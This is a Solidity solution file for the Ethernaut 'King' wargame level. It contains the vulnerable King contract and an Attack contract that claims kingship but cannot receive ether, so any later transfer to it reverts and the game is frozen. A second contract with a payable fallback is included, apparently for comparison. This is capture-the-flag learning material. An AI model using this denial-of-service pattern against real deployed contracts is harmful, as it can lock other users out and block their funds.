//SPDX-License-Identifier:MIT

//the ethernaut king challenge
//question: The contract below represents a very simple game: whoever sends it an amount 
//of ether that is larger than the current prize becomes the new king. On such an event,
//the overthrown king gets paid the new prize, making a bit of ether in the process!
//As ponzi as it gets xD

//When you submit the instance back to the level, the level is going to reclaim kingship.
//You will beat the level if you can avoid such a self proclamation

//solution: sometime writing fallback function is advantage and sometimes not,
//here not writing fallback function in the attck contract made attack contract to be a perminant king 

pragma solidity ^0.8.7;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor()payable{
    owner = payable(msg.sender);  
    king = payable(msg.sender);
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king =payable(msg.sender);
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}

//the stratagey here is failing the receive function at the tranfer() instruction
contract Attack{
  constructor()payable{
  }

  //here transfering the funds
  function addFunds(address payable addr)external{
    uint v=2000;
     (bool sent,) = addr.call{value: v}("");
    require(sent,"addFunds function failed");
  }
  

    function getBalance()external view returns(uint ){
        return address(this).balance;
    }

}


//Attack2 contract

contract Attack2{

  constructor()payable{}

  fallback()external payable{}

  function addFunds2(address addr)external{
    uint v=3000;
    (bool success,)=addr.call{value:v}("");
    require(success,"attack2 failed");
  }

  function getBalance()external view returns(uint ){
    return address(this).balance;
  }
}